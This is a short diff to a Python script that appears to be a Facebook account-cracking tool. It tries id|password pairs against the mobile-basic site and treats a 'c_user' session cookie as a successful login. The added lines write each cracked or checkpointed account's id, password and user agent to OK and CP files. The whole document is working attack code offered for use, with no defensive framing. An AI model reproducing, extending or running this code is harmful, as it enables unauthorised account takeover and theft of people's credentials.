@@ -1593,6 +1593,7 @@ def mbasic(idf, pwv):
                 tree.add(f"[bold yellow]{idf}|{pw}")
                 tree.add(f"[bold yellow]{ua}")
                 cetak(tree)
+                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                 akun.append(idf + '|' + pw)
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
@@ -1601,7 +1602,8 @@ def mbasic(idf, pwv):
                 tree = Tree(f"  ")
                 tree.add(f"[bold green]{idf}|{pw}")
                 tree.add(f"[bold green]{kuki}")
-                cetak(tree) 
+                cetak(tree)
+                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                 break
             else:
                 continue
